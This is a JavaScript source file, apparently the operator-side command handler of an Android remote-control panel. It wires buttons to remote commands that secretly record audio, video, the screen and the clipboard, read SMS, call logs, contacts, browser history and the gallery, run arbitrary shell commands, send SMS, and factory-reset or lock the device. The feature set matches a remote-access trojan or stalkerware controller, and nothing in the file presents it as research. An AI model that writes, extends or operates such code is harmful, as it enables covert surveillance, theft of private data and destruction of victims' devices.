// js/command-handler.js
import { sendCmd } from './utils.js';

export function setupCommandListeners(uid) {
    // Toggles
    setupToggle('cmd-flashlight', uid, 'flashlight');
    setupToggle('cmd-alarm', uid, 'alarm');
    setupToggle('cmd-audio', uid, 'record_audio');
    setupToggle('cmd-video', uid, 'record_video');
    setupToggle('cmd-ambient', uid, 'start_ambient', 'stop_ambient');
    setupToggle('cmd-screenrec', uid, 'record_screen', 'stop_screen_record');
    setupToggle('cmd-clipboard', uid, 'monitor_clipboard');

    // Triggers
    setupTrigger('cmd-capture', uid, 'cameraCapture');
    setupTrigger('cmd-screenshot', uid, 'take_screenshot');
    setupTrigger('cmd-readsms', uid, 'read_sms');
    setupTrigger('cmd-readcalls', uid, 'read_call_log');
    setupTrigger('cmd-readcontacts', uid, 'read_contacts');
    setupTrigger('cmd-readapps', uid, 'read_apps');
    setupTrigger('cmd-scanwifi', uid, 'scan_wifi');
    setupTrigger('cmd-readbattery', uid, 'read_battery');
    setupTrigger('cmd-readtraffic', uid, 'read_traffic');
    setupTrigger('cmd-deviceinfo', uid, 'collect_device_info');
    setupTrigger('cmd-gallery', uid, 'list_gallery');
    setupTrigger('cmd-browser', uid, 'read_browser_history');
    setupTrigger('cmd-storage', uid, 'storage_overview');

    // Special Actions
    const cmdLock = document.getElementById('cmd-lock');
    if(cmdLock) cmdLock.onclick = () => { 
        const s=!cmdLock.classList.contains("active"); 
        if(confirm(s?" Initialize Lockdown?":" Deactivate Lockdown?")) sendCmd(uid,"emergencyLock",s); 
    };

    const ts = document.getElementById('time-setter');
    if(ts) ts.onchange = (e) => { if(e.target.value) sendCmd(uid,'activation_time',e.target.value); };

    const sb = document.getElementById('cmd-shell');
    if(sb) sb.onclick = () => { 
        const c=document.getElementById('shell-input')?.value?.trim()||'ls /sdcard'; 
        sendCmd(uid,'shell_command',c); 
        const o=document.getElementById('shell-output'); 
        if(o){o.style.display='block';o.textContent=' Executing...';} 
    };

    const ssb = document.getElementById('cmd-sendsms');
    if(ssb) ssb.onclick = () => { 
        const n=document.getElementById('sms-number')?.value?.trim(); 
        const b=document.getElementById('sms-body')?.value?.trim(); 
        if(n&&b&&confirm(`Send SMS to ${n}?`)){sendCmd(uid,'send_sms_number',n);sendCmd(uid,'send_sms_body',b);} 
    };

    const lfb = document.getElementById('cmd-listfiles');
    if(lfb) lfb.onclick = () => { 
        const p=document.getElementById('file-path')?.value?.trim()||'/storage/emulated/0'; 
        sendCmd(uid,'list_files',p); 
        const o=document.getElementById('file-output'); 
        if(o){o.style.display='block';o.innerHTML='<span style="color:#ffaa00;"> Loading...</span>';} 
    };

    const sgb = document.getElementById('cmd-setgeo');
    if(sgb) sgb.onclick = () => { 
        const la=parseFloat(document.getElementById('geo-lat')?.value); 
        const ln=parseFloat(document.getElementById('geo-lng')?.value); 
        const r=parseFloat(document.getElementById('geo-radius')?.value)||1000; 
        if(!isNaN(la)&&!isNaN(ln)){sendCmd(uid,'geofence_lat',la);sendCmd(uid,'geofence_lng',ln);sendCmd(uid,'geofence_radius',r);} 
    };
    
    const dgb = document.getElementById('cmd-disablegeo');
    if(dgb) dgb.onclick = () => sendCmd(uid,'disable_geofence',true);

    // Danger Zone
    const rb = document.getElementById('cmd-reboot');
    if(rb) rb.onclick = () => { if(confirm("️ REBOOT DEVICE?")) sendCmd(uid,'reboot_device',true); };
    const sdb = document.getElementById('cmd-shutdown');
    if(sdb) sdb.onclick = () => { if(confirm("️ SHUTDOWN DEVICE?")) sendCmd(uid,'shutdown_device',true); };
    const fb = document.getElementById('cmd-factory');
    if(fb) fb.onclick = () => { if(confirm("🚨 FACTORY RESET? ERASE ALL DATA?")){if(confirm("ABSOLUTELY sure?")) sendCmd(uid,'factory_reset',true);} };
    const lnb = document.getElementById('cmd-locknow');
    if(lnb) lnb.onclick = () => { if(confirm(" Lock screen now?")) sendCmd(uid,'lock_screen_now',true); };
    const ub = document.getElementById('cmd-uninstall');
    if(ub) ub.onclick = () => { const p=prompt("Package name to uninstall:"); if(p) sendCmd(uid,'uninstall_app',p); };
}

function setupToggle(btnId, uid, cmd, offCmd) {
    const btn = document.getElementById(btnId); if(!btn) return;
    btn.onclick = () => { const active=btn.classList.contains("active"); if(offCmd&&active) sendCmd(uid,offCmd,true); else sendCmd(uid,cmd,!active); };
}

function setupTrigger(btnId, uid, cmd) {
    const btn = document.getElementById(btnId); if(!btn) return;
    btn.onclick = () => {
        sendCmd(uid, cmd, true);
        btn.style.background = '#00ff88'; btn.style.color = '#000'; btn.style.borderColor = '#00ff88'; btn.style.boxShadow = '0 0 20px rgba(0, 255, 136, 0.5)';
        const s = btn.querySelector('.toggle-state');
        if(s){s.textContent='SENT ✓';s.style.color='#000';s.style.fontWeight='bold';}
        setTimeout(()=>{btn.style.background='';btn.style.color='';btn.style.borderColor='';btn.style.boxShadow='';if(s){s.textContent='TRIGGER';s.style.color='#666';s.style.fontWeight='normal';}},2000);
    };
}
